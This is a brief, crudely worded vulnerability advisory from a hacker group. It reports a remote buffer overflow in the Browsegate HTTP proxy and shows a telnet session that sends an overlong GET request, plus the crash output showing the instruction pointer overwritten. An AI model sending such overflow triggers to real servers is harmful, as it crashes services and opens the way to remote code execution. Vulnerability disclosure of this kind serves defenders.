Browsegate Remote Compromise Advisory
Released by Wizdumb under MDMA (Moronic Demonic Monkey Asylum)

The Browsegate Proxy server &lt;www.netcplus.com> is affected by a remote
exploitable buffer overflow in the HTTP proxy. Both the @Home and @Work
versions are exploitable - personally I didn't see any difference in them at
all, but some shmucks pay more for the one, so wtf. ;-)

The buffer overflow is triggered like so...

[wizdumb@mdma]$ telnet my.mommy.is.goddamn.leet.org 80
Trying 10.0.0.3...
Connected to momz.el8.box.
Escape character is '^]'.
GET http://(250 'a' characters)

At which point...

BRWGATE caused an invalid page fault in
module &lt;unknown> at 0084:61616161.
